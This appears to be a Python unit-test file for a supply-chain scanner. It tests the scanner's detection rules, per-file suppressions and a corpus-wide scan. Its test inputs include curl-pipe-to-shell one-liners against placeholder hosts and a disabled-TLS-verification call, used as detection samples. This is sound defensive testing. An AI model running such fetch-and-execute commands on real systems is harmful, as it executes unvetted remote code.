import json
import unittest
from pathlib import Path

import sys

REPO_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(REPO_ROOT / "scripts"))

import skill_supply_chain_scan as scan  # noqa: E402


class RuleTests(unittest.TestCase):
    def test_every_rule_has_a_stable_id_and_mechanism(self):
        ids = [r.id for r in scan.RULES]
        self.assertEqual(len(ids), len(set(ids)), "duplicate rule ids")
        for rule in scan.RULES:
            self.assertTrue(rule.mechanism.strip(), rule.id)
            self.assertIn(
                rule.severity,
                {"critical", "high", "medium", "low", "informational"},
            )

    def test_executable_only_rules_do_not_fire_on_documentation(self):
        rule = next(r for r in scan.RULES if r.id == "EXEC-CURL-PIPE-SHELL")
        self.assertTrue(rule.executable_only)
        found, _ = scan.scan_text("curl https://x.sh | sh\n", "a.md", executable=False)
        self.assertEqual(found, [])

    def test_tls_verification_disabled_is_detected_in_code(self):
        found, _ = scan.scan_text(
            "resp = requests.get(u, verify=False)\n", "a.py", executable=True
        )
        self.assertIn("NET-TLS-VERIFY-DISABLED", {f.rule_id for f in found})

    def test_pipe_to_shell_is_critical_in_code(self):
        found, _ = scan.scan_text(
            "curl -sSfL https://x.example/i.sh | sh\n", "a.sh", executable=True
        )
        severities = {f.rule_id: f.severity for f in found}
        self.assertEqual(severities.get("EXEC-CURL-PIPE-SHELL"), "critical")

    def test_placeholder_secrets_are_not_reported(self):
        found, _ = scan.scan_text(
            "--access-key-id AKIAEXPOSEDKEY123456\n", "a.md", executable=False
        )
        self.assertEqual([f for f in found if f.rule_id == "SEC-HARDCODED-SECRET"], [])


class SuppressionTests(unittest.TestCase):
    def test_suppression_is_scoped_to_file_and_rule(self):
        s = scan.SuppressionSet((scan.Suppression("a/b.py", "RULE", "reason"),))
        finding = scan.Finding(
            rule_id="RULE",
            severity="high",
            title="t",
            mechanism="m",
            path="a/b.py",
            line_number=1,
            snippet="",
            executable=True,
        )
        self.assertEqual(s.check(finding), "reason")

        other_file = scan.Finding(
            rule_id="RULE",
            severity="high",
            title="t",
            mechanism="m",
            path="a/OTHER.py",
            line_number=1,
            snippet="",
            executable=True,
        )
        self.assertIsNone(s.check(other_file), "must not suppress other files")

        other_rule = scan.Finding(
            rule_id="DIFFERENT",
            severity="high",
            title="t",
            mechanism="m",
            path="a/b.py",
            line_number=1,
            snippet="",
            executable=True,
        )
        self.assertIsNone(s.check(other_rule), "must not suppress other rules")

    def test_suppressed_findings_are_reported_not_discarded(self):
        s = scan.SuppressionSet(
            (scan.Suppression("a/b.py", "NET-TLS-VERIFY-DISABLED", "known"),)
        )
        found, suppressed = scan.scan_text(
            "requests.get(u, verify=False)\n", "a/b.py", True, s
        )
        self.assertEqual(found, [])
        self.assertEqual(len(suppressed), 1)
        self.assertEqual(suppressed[0][1], "known")

    def test_repository_suppressions_are_well_formed(self):
        path = REPO_ROOT / ".skill-scan-suppressions.json"
        self.assertTrue(path.is_file(), "suppression file must exist")
        data = json.loads(path.read_text(encoding="utf-8"))
        entries = data["suppressions"]
        self.assertGreater(len(entries), 0)
        seen = set()
        for entry in entries:
            for field in ("path", "rule_id", "reason"):
                self.assertIn(field, entry)
            self.assertGreater(
                len(entry["reason"]), 20, "every suppression needs a real reason"
            )
            key = (entry["path"], entry["rule_id"])
            self.assertNotIn(key, seen, f"duplicate suppression {key}")
            seen.add(key)
            self.assertTrue(
                (REPO_ROOT / entry["path"]).exists(),
                f"suppression targets a missing file: {entry['path']}",
            )

    def test_every_suppressed_path_exists_in_the_corpus(self):
        """A suppression pointing at a non-scanned file is dead config."""
        for entry in load_entries():
            self.assertTrue((REPO_ROOT / entry["path"]).is_file())


def load_entries():
    path = REPO_ROOT / ".skill-scan-suppressions.json"
    if not path.is_file():
        return []
    return json.loads(path.read_text(encoding="utf-8"))["suppressions"]


class CorpusTests(unittest.TestCase):
    """The published headline number must not silently regress."""

    @classmethod
    def setUpClass(cls):
        cls.report = scan.scan_corpus(REPO_ROOT)

    def test_corpus_was_actually_scanned(self):
        self.assertGreater(self.report.scanned_files, 1000)
        self.assertGreater(self.report.executable_files, 500)

    def test_no_critical_findings_remain(self):
        critical = [f for f in self.report.findings if f.severity == "critical"]
        self.assertEqual(
            critical, [], f"unresolved criticals: {[f.path for f in critical[:5]]}"
        )

    def test_scan_is_deterministic(self):
        again = scan.scan_corpus(REPO_ROOT)
        self.assertEqual(
            [(f.rule_id, f.path, f.line_number) for f in self.report.findings],
            [(f.rule_id, f.path, f.line_number) for f in again.findings],
        )

    def test_suppressions_are_all_actually_used(self):
        used = {(f.path, f.rule_id) for f, _ in self.report.suppressed}
        for entry in load_entries():
            self.assertIn(
                (entry["path"], entry["rule_id"]),
                used,
                f"stale suppression: {entry['path']} {entry['rule_id']}",
            )


if __name__ == "__main__":
    unittest.main()
